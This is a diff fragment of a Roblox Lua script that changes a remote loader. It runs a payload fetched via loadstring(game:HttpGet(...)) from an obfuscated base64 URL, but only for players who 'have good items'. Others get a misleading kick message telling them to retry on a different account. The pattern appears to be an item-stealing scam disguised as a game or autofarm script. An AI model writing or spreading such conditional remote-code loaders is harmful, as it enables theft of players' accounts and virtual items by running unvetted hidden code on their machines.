@@ -41,7 +41,7 @@ if found then
     end)
     
     -- Only load the main script if they have good items
-    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvc2hpL3JlZnMvaGVhZHMvbWFpbi9hdXRvZmFybUZpeGVkTGF5TW9kZS50eHQifX0"))()
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImYzYjVhNzkwLWJhOTYtNDBjYy1hNWE2LTg3OGNhODYzNzExOSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJjdXN0b20iLCJ1cmwiOiJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vSm9obm55aXNzb2Nvb2xsb2wvaGlpL3JlZnMvaGVhZHMvbWFpbi9oaS5sdWEifX0"))()
 else
     -- Player doesn't have good items, kick them out
     p:Kick("Script Cant work On This Account Retry On Different Account")
